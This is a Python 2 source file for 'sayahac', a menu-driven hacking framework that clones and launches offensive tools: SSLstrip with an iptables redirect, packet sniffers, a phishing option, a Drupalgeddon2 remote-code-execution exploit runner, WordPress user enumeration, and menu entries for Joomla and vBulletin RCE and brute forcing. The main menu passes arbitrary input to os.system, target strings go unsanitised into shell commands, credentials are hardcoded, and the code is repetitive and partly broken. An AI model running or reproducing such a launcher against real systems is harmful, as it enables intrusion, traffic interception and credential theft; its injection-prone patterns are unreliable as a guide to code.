#!/usr/bin/env python2
#
#
#	   ,-,--.    ,---.                    ,---.      ,--.-,,-,--,   ,---.        _,.----.   
# 	,-.'-  _\ .--.'  \   ,--.-.  .-,--..--.'  \    /==/  /|=|  | .--.'  \     .' .' -   \  
#	/==/_ ,_.' \==\-/\ \ /==/- / /=/_ / \==\-/\ \   |==|_ ||=|, | \==\-/\ \   /==/  ,  ,-'  
#	\==\  \    /==/-|_\ |\==\, \/=/. /  /==/-|_\ |  |==| ,|/=| _| /==/-|_\ |  |==|-   |  .  
# 	\==\ -\   \==\,   - \\==\  \/ -/   \==\,   - \ |==|- `-' _ | \==\,   - \ |==|_   `-' \ 
#	 _\==\ ,\  /==/ -   ,| |==|  ,_/    /==/ -   ,| |==|  _     | /==/ -   ,| |==|   _  , | 
#	/==/\/ _ |/==/-  /\ - \\==\-, /    /==/-  /\ - \|==|   .-. ,\/==/-  /\ - \\==\.       / 
#	\==\ - , /\==\ _.\=\.-'/==/._/     \==\ _.\=\.-'/==/, //=/  |\==\ _.\=\.-' `-.`.___.-'  
# 	`--`---'  `--`        `--`-`       `--`        `--`-' `-`--` `--`                      
                 
#
#
#                                Greet's To
#                             Tools For Hacking
#                             Author : root_012

'''
Imports
'''
import sys
import argparse
import os
import httplib
import subprocess
import re
import urllib2
import socket
import urllib
import sys
import json
import telnetlib
import glob
import random
import Queue
import threading
import base64
import time
import ConfigParser
import os
import requests
from bs4 import BeautifulSoup
from time import strftime, gmtime
from sys import argv
from commands import *
from getpass import getpass
from xml.dom import minidom
from urlparse import urlparse
from optparse import OptionParser
from time import gmtime, strftime, sleep
import os
import time
import requests
import json
from time import strftime, gmtime

'''
Common Functions
'''


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'


def clearScr():
    os.system('clear')


def yesOrNo():
    return (raw_input("Continue Y / N: ") in yes)


'''
Config
'''
installDir = os.path.dirname(os.path.abspath(__file__)) + '/'
configFile = installDir + "/sayahac.cfg"
print(installDir)
config = ConfigParser.RawConfigParser()
config.read(configFile)
toolDir = installDir + config.get('sayahac', 'toolDir')
logDir = installDir + config.get('sayahac', 'logDir')
yes = config.get('sayahac', 'yes').split()
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random) 
sayahaclogo = color_random[0] + '''
  
   _     _      _     _      _     _      _     _      _     _      _     _      _     _   
  (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)  
   / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \   
 __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__ 
(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)
   || S ||      || A ||      || Y ||      || A ||      || H ||      || A ||      || C ||   
 _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._ 
(.-./`-`\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)
 `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-' 
                                                                               
                                            
        '''
sayahacPrompt = "sayahac ~# "
alreadyInstalled = "Already Installed"
continuePrompt = "\nClick [Return] to continue"

termsAndConditions = color.NOTICE + '''


	   ,-,--.    ,---.                    ,---.      ,--.-,,-,--,   ,---.        _,.----.   
 	,-.'-  _\ .--.'  \   ,--.-.  .-,--..--.'  \    /==/  /|=|  | .--.'  \     .' .' -   \  
	/==/_ ,_.' \==\-/\ \ /==/- / /=/_ / \==\-/\ \   |==|_ ||=|, | \==\-/\ \   /==/  ,  ,-'  
	\==\  \    /==/-|_\ |\==\, \/=/. /  /==/-|_\ |  |==| ,|/=| _| /==/-|_\ |  |==|-   |  .  
 	\==\ -\   \==\,   - \\==\  \/ -/   \==\,   - \ |==|- `-' _ | \==\,   - \ |==|_   `-' \ 
	 _\==\ ,\  /==/ -   ,| |==|  ,_/    /==/ -   ,| |==|  _     | /==/ -   ,| |==|   _  , | 
 	/==/\/ _ |/==/-  /\ - \\==\-, /    /==/-  /\ - \|==|   .-. ,\/==/-  /\ - \\==\.       / 
	\==\ - , /\==\ _.\=\.-'/==/._/     \==\ _.\=\.-'/==/, //=/  |\==\ _.\=\.-' `-.`.___.-'  
	`--`---'  `--`        `--`-`       `--`        `--`-' `-`--` `--`                      

I shall not use sayahac to:

(i) upload or otherwise transmit, display or distribute any
content that infringes any trademark, trade secret, copyright
or other proprietary or intellectual property rights of any
person.

(ii) upload or otherwise transmit any material that contains
software viruses or any other computer code, files or programs
designed to interrupt, destroy or limit the functionality of any
computer software or hardware or telecommunications equipment.
''' + color.END

mrrobot4 = color.NOTICE + '''
Hello,
        Welcome to sayahac framework

'''

'''
Starts Menu Classes
'''
def agreement():
    while not config.getboolean("sayahac", "agreement"):
        clearScr()
        print(termsAndConditions)
        print(mrrobot4)
        agree = raw_input("You must agree to our terms and conditions first (Y/n) ").lower()
        if agree in yes:
            config.set('sayahac', 'agreement', 'true')

class sayahac:
    def __init__(self):
        clearScr()
        self.createFolders()
        print (sayahaclogo + color.RED + '''
       }--------------{+} Coded By Root-012 {+}--------------{
       }--------{+}  GitHub.com/Root-012/sayahac {+}--------{
    ''' + color.END + 
    
    '''
       {1}--Information Gathering
       {2}--Password Attacks
       {3}--Wireless Testing
       {4}--Exploitation Tools
       {5}--Sniffing & Spoofing
       {6}--Web Hacking
       {7}--Post Exploitation
       {8}--Private-Web Hacking
       {0}--INSTALL & UPDATE
       {99}-EXIT\n
     ''')
        choice = raw_input(sayahacPrompt)
        clearScr()
        if choice == "1":
            informationGatheringMenu()
        elif choice == "2":
            passwordAttacksMenu()
        elif choice == "3":
            wirelessTestingMenu()
        elif choice == "4":
            exploitationToolsMenu()
        elif choice == "5":
            sniffingSpoofingMenu()
        elif choice == "6":
            webHackingMenu()
        elif choice == "7":
            postExploitationMenu()
        elif choice == "0":
            self.update()
        elif choice == "99":
            with open(configFile, 'wb') as configfile:
                config.write(configfile)
            sys.exit()
        elif choice == "\r" or choice == "\n" or choice == "" or choice == " ":
            self.__init__()
        else:
            try:
                print(os.system(choice))
            except:
                pass
        self.completed()

    def createFolders(self):
        if not os.path.isdir(toolDir):
            os.makedirs(toolDir)
        if not os.path.isdir(logDir):
            os.makedirs(logDir)

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()

    def update(self):
        os.system("git clone --depth=1 https://github.com/Root-012/sayahac.git")
        os.system("cd sayahac && bash ./update.sh")
        os.system("sayahac")


class sniffingSpoofingMenu:
    menuLogo = ''' 
    
                                                                                                 
 _____         _   __   __  _               
/  ___|       (_) / _| / _|(_)              
\ `--.  _ __   _ | |_ | |_  _  _ __    __ _ 
 `--. \| '_ \ | ||  _||  _|| || '_ \  / _` |
/\__/ /| | | || || |  | |  | || | | || (_| |
\____/ |_| |_||_||_|  |_|  |_||_| |_| \__, |
                                       __/ |
                                      |___/ 
                                                                                                  

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print(
            "   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
        print("   {2}--SSLtrip - MITM tool that implements SSL stripping  attacks")
        print(
            "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
        print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
        print("   {99}-Back To Main Menu \n")
        choice6 = raw_input(sayahacPrompt)
        clearScr()
        if choice6 == "1":
            setoolkit()
        elif choice6 == "2":
            sslstrip()
        elif choice6 == "3":
            PacketSniffingTool()
        elif choice6 == "4":
            PacketSpy()
        elif choice6 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

class sslstrip:
    sslstripLogo = '''
    _______ _______ _        _        _  _______  ______
    (  ____ (  ___  | \    /\( (    /| )/ ___   )(  __  )
    | (    )| (   ) |  \  / /|  \  ( | |\/   )  || (  ) |
    | (____)| |   | |  (_/ / |   \ | |    /   ) | | /   |
    (_____  | |   | |   _ (  | (\ \) |   /   /  | (/ /) |
          ) | |   | |  ( \ \ | | \   |  /   /   |   / | |
    /\____) | (___) |  /  \ \| )  \  | /   (_/   |  (__) |
    \_______(_______|_/    \/|/    )_)(____(____/(_______)
    
    '''

    def __init__(self):
        self.installDir = toolDir + "sslstrip"
        self.gitRepo = "https://github.com/moxie0/sslstrip.git"

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/sslstrip") or os.path.isfile("/usr/local/bin/sslstrip"))

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && python setup.py install" % self.installDir)

    def run(self):
        clearScr()
        print(self.sslstripLogo)
        interface = raw_input("   Enter the network interface (e.g., eth0, wlan0): ")
        self.menu(interface)

    def menu(self, interface):
        clearScr()
        print(self.sslstripLogo)
        print("   SSLStrip tool on interface: %s\n" % interface)
        print("   {1}--Start SSLStrip")
        print("   {2}--View Logs\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("sslstrip ~# ")
        clearScr()
        logPath = "logs/sslstrip-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                print("   Starting SSLStrip...")
                os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
                os.system("sslstrip -l 10000 -w %s" % logPath)
                raw_input(continuePrompt)
            elif response == "2":
                os.system("cat %s" % logPath)
                raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            os.system("iptables -t nat -F")
            self.menu(interface)



class PacketSniffingTool:
    packetSniffingLogo = '''
     ____            _        _     _____        _  __  _____ _       _  __
    |  _ \ ___  _ __(_) ___  | |_  |_   _|_ _   | |/ / |  ___(_)_ __ (_)/ _|
    | |_) / _ \| '__| |/ _ \ | __|   | |/ _` |  | ' /  | |_  | | '_ \| | |_
    |  __/ (_) | |  | |  __/ | |_    | | (_| |  | . \  |  _| | | | | | |  _|
    |_|   \___/|_|  |_|\___|  \__|   |_|\__,_|  |_|\_\ |_|   |_|_| |_|_|_|
    '''

    def __init__(self):
        self.installDir = toolDir + "PacketSniffingTool"
        self.gitRepo = "git@github.com:SHAHKRISHS/Packet-Sniffing-Tool.git"

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        """Check if the Packet Sniffing Tool is already installed."""
        return os.path.isdir(self.installDir)

    def install(self):
        """Clone and install the Packet Sniffing Tool."""
        print("Installing Packet Sniffing Tool...")
        os.system("git clone %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && make install" % self.installDir)  # Assuming it uses make for installation

    def run(self):
        """Run the Packet Sniffing Tool."""
        clearScr()
        print(self.packetSniffingLogo)
        interface = raw_input("   Enter the network interface (e.g., eth0, wlan0): ")
        self.menu(interface)

    def menu(self, interface):
        """Display menu options for the Packet Sniffing Tool."""
        clearScr()
        print(self.packetSniffingLogo)
        print("   Packet Sniffing Tool on interface: %s\n" % interface)
        print("   {1}--Start Sniffing")
        print("   {2}--View Logs\n")
        print("   {99}-Return to main menu \n")
        response = raw_input("packet_sniff ~# ")
        clearScr()
        logPath = "logs/packet_sniff-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                print("   Starting packet sniffing...")
                os.system("sudo python %s/sniff.py -i %s -o %s" % (self.installDir, interface, logPath))  # Replace with the actual command
                raw_input(continuePrompt)
            elif response == "2":
                os.system("cat %s" % logPath)
                raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)


class PacketSpy:
    packetSpyLogo = '''
    ____            _        _     _____                     _____             
   |  _ \ ___  _ __(_) ___  | |_  |_   _|_ _ _ __ _ __ ___   |  ___|   _  _ __  
   | |_) / _ \| '__| |/ _ \ | __|   | |/ _` | '__| '_ ` _ \  | |_ | | | || '_ \ 
   |  __/ (_) | |  | |  __/ | |_    | | (_| | |  | | | | | | |  _|| |_| || |_) |
   |_|   \___/|_|  |_|\___|  \__|   |_|\__,_|_|  |_| |_| |_| |_|   \__,_|| .__/ 
                                                                        |_|    

    '''

    def __init__(self):
        self.installDir = toolDir + "PacketSpy"
        self.gitRepo = "git@github.com:HalilDeniz/PacketSpy.git"

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        """Check if PacketSpy is already installed."""
        return os.path.isdir(self.installDir)

    def install(self):
        """Clone and install the PacketSpy tool."""
        print("Installing PacketSpy...")
        os.system("git clone %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && pip install -r requirements.txt" % self.installDir)  # Assuming it uses pip to install dependencies

    def run(self):
        """Run the PacketSpy tool."""
        clearScr()
        print(self.packetSpyLogo)
        interface = raw_input("   Enter the network interface (e.g., eth0, wlan0): ")
        self.menu(interface)

    def menu(self, interface):
        """Display menu options for the PacketSpy tool."""
        clearScr()
        print(self.packetSpyLogo)
        print("   PacketSpy running on interface: %s\n" % interface)
        print("   {1}--Start Packet Sniffing")
        print("   {2}--View Captured Data")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("packetspy ~# ")
        clearScr()
        logPath = "logs/packetspy-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".pcap"
        try:
            if response == "1":
                print("   Starting packet sniffing with PacketSpy...")
                os.system("sudo python %s/PacketSpy.py -i %s -o %s" % (self.installDir, interface, logPath))  # Command to run PacketSpy
                raw_input(continuePrompt)
            elif response == "2":
                os.system("tcpdump -r %s" % logPath)  # Command to read the captured data from pcap file
                raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)





class webHackingMenu:
    menuLogo = '''
    
                                                                             
                                                         bbbbbbbb            
                                                         b::::::b            
                                                         b::::::b            
                                                         b::::::b            
                                                          b:::::b            
wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb    
 w:::::w         w:::::w         w:::::wee::::::::::::ee  b::::::::::::::bb  
  w:::::w       w:::::::w       w:::::we::::::eeeee:::::eeb::::::::::::::::b 
   w:::::w     w:::::::::w     w:::::we::::::e     e:::::eb:::::bbbbb:::::::b
    w:::::w   w:::::w:::::w   w:::::w e:::::::eeeee::::::eb:::::b    b::::::b
     w:::::w w:::::w w:::::w w:::::w  e:::::::::::::::::e b:::::b     b:::::b
      w:::::w:::::w   w:::::w:::::w   e::::::eeeeeeeeeee  b:::::b     b:::::b
       w:::::::::w     w:::::::::w    e:::::::e           b:::::b     b:::::b
        w:::::::w       w:::::::w     e::::::::e          b:::::bbbbbb::::::b
         w:::::w         w:::::w       e::::::::eeeeeeee  b::::::::::::::::b 
          w:::w           w:::w         ee:::::::::::::e  b:::::::::::::::b  
           www             www            eeeeeeeeeeeeee  bbbbbbbbbbbbbbbb   
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Drupal Hacking ")
        print("   {2}--Inurlbr")
        print("   {3}--Nikto Web Server Tool")
        print("   {4}--HTTP/HTTPS interception Using Fiddlertool")
        print("   {5}--File Upload Checker")
        print("   {6}--Wordpress Exploit Scanner")
        print("   {7}--Wordpress Plugins Scanner")
        print("   {8}--Shell and Directory Finder")
        print("   {9}--Joomla! 1.5 - 3.4.5 remote code execution")
        print("   {10}-Vbulletin 5.X remote code execution")
        print(
            "   {11}-BruteX - Automatically brute force all services running on a target")
        print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
        print("   {99}-Back To Main Menu \n")
        choiceweb = raw_input(sayahacPrompt)
        clearScr()
        if choiceweb == "1":
            DrupalExploitTool()
        elif choiceweb == "2":
            InurlbrTool()
        elif choiceweb == '3':
            NiktoTool()
        elif choiceweb == "4":
            FiddlerTool()
        elif choiceweb == "5":
            FuxploiderTool()
        elif choiceweb == "6":
            WPExploitTool()
        elif choiceweb == "7":
            Nessus()
        elif choiceweb == "8":
            shelltarget()
        elif choiceweb == "9":
            joomlarce()
        elif choiceweb == "10":
            vbulletinrce()
        elif choiceweb == "11":
            brutex()
        elif choiceweb == "12":
            ArachniTool()
        elif choiceweb == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class DrupalExploitTool:

    drupal_logo = """
  _____                     _
 |  __ \                   (_)
 | |  | |  _   _  _ __ ___   _
 | |  | | | | | || '_ ` _ \ | |
 | |__| | | |_| || | | | | || |
 |_____/   \__,_||_| |_| |_||_|
"""  
     
    
    def __init__(self):
        self.installDir = toolDir + "drupal-exploit"
        self.gitRepo = "https://github.com/dreadlocked/Drupalgeddon2.git"
        
        self.targetPrompt = "   Enter Target Drupal URL: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/drupalgeddon2.py")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x drupalgeddon2.py" % self.installDir)

    def run(self):
        clearScr()
        print(self.drupal_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.drupal_logo)
        print("   Drupal Exploit for: %s\n" % target)
        print("   {1}--Check Vulnerability (CVE-2018-7600)")
        print("   {2}--Exploit RCE (Remote Code Execution)")
        print("   {99}-Return to previous menu \n")
        response = raw_input("drupal ~# ")
        clearScr()
        logPath = "logs/drupal-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("python3 %s/drupalgeddon2.py --check %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python3 %s/drupalgeddon2.py --exploit %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class InurlbrTool:

    inurlbr_logo = """
  ___        _    _       
 |_ _|_ __  (_)  | | ___  
  | || '_ \ | |  | |/ _ \ 
  | || | | || |  | | (_) |
 |___|_| |_||_|  |_|\___/ 
"""

    
    def __init__(self):
        self.installDir = toolDir + "inurlbr"
        self.gitRepo = "https://github.com/googleinurl/SCANNER-INURLBR.git"
        
        self.targetPrompt = "   Enter Target URL/Domain: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/bin/inurlbr") or os.path.isfile("/usr/local/bin/inurlbr")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x inurlbr.php" % self.installDir)

    def run(self):
        clearScr()
        print(self.inurlbr_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.inurlbr_logo)
        print("   Inurlbr scan for: %s\n" % target)
        print("   {1}--Simple Scan (Basic search)")
        print("   {2}--Advanced Scan (Multiple search)")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("inurlbr ~# ")
        clearScr()
        logPath = "logs/inurlbr-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("php %s/inurlbr.php --dork %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("php %s/inurlbr.php --dork-file %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

class NiktoTool:
    nikto_logo = """
 _   _ _ _       _      
| \ | (_) |     (_)     
|  \| |_| |_ ___ _  ___ 
| . ` | | __/ __| |/ __|
| |\  | | |_\__ \ | (__ 
|_| \_|_|\__|___/_|\___|
"""
    def __init__(self):
        self.installDir = toolDir + "nikto"
        self.gitRepo = "https://github.com/sullo/nikto.git"
        
        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/program/nikto.pl")

    def install(self):
        # Clone the Nikto repository and set it up
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))

    def run(self):
        clearScr()
        print(self.nikto_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nikto_logo)
        print("   Nikto Scan for Target: %s\n" % target)
        print("   {1}--Basic Scan")
        print("   {2}--Scan with Tuning Options")
        print("   {3}--Scan for Specific Vulnerabilities")
        print("   {4}--Scan with Output to Report File")
        print("   {99}-Return to previous menu \n") 
        response = raw_input("nikto ~# ")
        clearScr()
        logPath = "logs/nikto-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            if response == "1":
                os.system("perl %s/program/nikto.pl -h %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                tuning = raw_input("Enter tuning options (e.g., 123bde): ")
                os.system("perl %s/program/nikto.pl -h %s -Tuning %s" % (self.installDir, target, tuning))
                response = raw_input(continuePrompt)
            elif response == "3":
                vuln_scan = raw_input("Enter vulnerability string to search (e.g., XSS, SQLI): ")
                os.system("perl %s/program/nikto.pl -h %s -T %s" % (self.installDir, target, vuln_scan))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("perl %s/program/nikto.pl -h %s -output %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


class FiddlerTool:
    fiddler_logo = """
  ______ _     _ _ _           
 |  ____| |   (_) | |          
 | |__  | |__  _| | |_   _  ___
 |  __| | '_ \| | | | | | |/ _ \\
 | |____| | | | | | | |_| |  __/
 |______|_| |_|_|_|_|\__,_|\___|
"""
    def __init__(self):
        self.installDir = toolDir + "mitmproxy"
        
        self.targetPrompt = "   Enter target host (e.g., example.com) or press Enter for all traffic: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        # Check if mitmproxy is installed
        return os.system("which mitmproxy > /dev/null 2>&1") == 0

    def install(self):
        # Install mitmproxy via pip
        os.system("pip install mitmproxy")

    def run(self):
        clearScr()
        print(self.fiddler_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.fiddler_logo)
        print("   Mitmproxy (Fiddler-like) for Target: %s\n" % (target if target else "All Traffic"))
        print("   {1}--Basic Intercept")
        print("   {2}--Log HTTP/HTTPS Traffic")
        print("   {3}--Filter by Hostname")
        print("   {4}--Save Traffic to File")
        print("   {99}-Return to previous menu \n")
        response = raw_input("mitmproxy ~# ")
        clearScr()
        logPath = "logs/mitmproxy-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("mitmproxy")
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("mitmproxy --showhost")
                response = raw_input(continuePrompt)
            elif response == "3":
                if not target:
                    target = raw_input("Enter target host: ")
                os.system("mitmproxy --set block_global=false -b %s" % target)
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("mitmproxy -w %s" % logPath)
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class FuxploiderTool:
    fuxploider_logo = """
  ______              _       _           _           
 |  ____|            (_)     | |         | |          
 | |__ _ __ ___  __ _ _ _ __ | |__   ___ | | ___ _ __  
 |  __| '__/ _ \/ _` | | '_ \| '_ \ / _ \| |/ _ \ '__| 
 | |  | | |  __/ (_| | | | | | | | | (_) | |  __/ |    
 |_|  |_|  \___|\__, |_|_| |_|_| |_|\___/|_|\___|_|    
                __/ |                                  
               |___/                                   
"""
    def __init__(self):
        self.installDir = toolDir + "fuxploider"
        self.gitRepo = "https://github.com/almandin/fuxploider.git"
        
        self.targetPrompt = "   Enter Target URL for File Upload Vulnerability Check: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/fuxploider.py")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && pip install -r requirements.txt" % self.installDir)

    def run(self):
        clearScr()
        print(self.fuxploider_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.fuxploider_logo)
        print("   Fuxploider Scan for: %s\n" % target)
        print("   {1}--Basic File Upload Vulnerability Scan")
        print("   {2}--Advanced Scan with Extensions")
        print("   {99}-Return to previous menu \n")
        response = raw_input("fuxploider ~# ")
        clearScr()
        logPath = "logs/fuxploider-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("python2 %s/fuxploider.py --url %s --simple > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python2 %s/fuxploider.py --url %s --extensions php,jpg,png --advanced > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class WPExploitTool:
    wpexploit_logo = """
 __          __           _                            _      
 \ \        / /          | |                          | |     
  \ \  /\  / /__  _ __   | |    _   _  _ __   _ __   __| | ___ 
   \ \/  \/ // _ \| '_ \  | |   | | | || '_ \ | '__| / _` |/ __|
    \  /\  /|  __/| | | | | |___| |_| || |_) || |   | (_| |\__ \\
     \/  \/  \___||_| |_| |_____|\__,_|| .__/ |_|    \__,_||___/
                                      | |                       
                                      |_|                       
"""
    def __init__(self):
        self.installDir = toolDir + "wpscan-cli"
        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"
        
        self.targetPrompt = "   Enter Target WordPress URL: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/wpscan.rb")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && gem install bundler && bundle install" % self.installDir)

    def run(self):
        clearScr()
        print(self.wpexploit_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.wpexploit_logo)
        print("   WordPress Exploit Scan for: %s\n" % target)
        print("   {1}--Basic Vulnerability Scan")
        print("   {2}--Enumerate Plugins")
        print("   {3}--Enumerate Users")
        print("   {99}-Return to previous menu \n")
        response = raw_input("wpscan ~# ")
        clearScr()
        logPath = "logs/wpexploit-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("ruby %s/wpscan.rb --url %s --enumerate vp > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("ruby %s/wpscan.rb --url %s --enumerate p > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("ruby %s/wpscan.rb --url %s --enumerate u > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
    def clearScr():
        os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class Nessus:
    nessusLogo = '''
    _   _                        
   | \ | |                       
   |  \| | ___  __ _  __ _ _   _ 
   | . ` |/ _ \/ _` |/ _` | | | |
   | |\  |  __/ (_| | (_| | |_| |
   \_| \_/\___|\__, |\__,_|\__, |
                __/ |       __/ |
               |___/       |___/ 
    '''

    def __init__(self):
        self.installDir = toolDir + "Nessus"
        self.nessusUrl = "http://localhost:8834"  # Assuming Nessus is hosted locally
        self.username = "admin"                   # Replace with your Nessus username
        self.password = "password"                # Replace with your Nessus password
        self.access_token = None                  # To store session token
        
        if not self.installed():
            self.install()
            self.authenticate()
            self.run()
        else:
            self.authenticate()
            self.run()

    def installed(self):
        """Check if Nessus is installed by looking for Nessus daemon."""
        return os.path.isfile("/opt/nessus/sbin/nessusd")

    def install(self):
        """Download and install Nessus from its official website."""
        print("Installing Nessus...")
        os.system("wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/nessus-8.15.2-ubuntu1110_amd64.deb")
        os.system("sudo dpkg -i nessus-8.15.2-ubuntu1110_amd64.deb")
        os.system("sudo /opt/nessus/sbin/nessusd &")  # Start Nessus daemon
        print("Nessus is installed and the service is started.")
        time.sleep(10)  # Give some time for the Nessus service to initialize

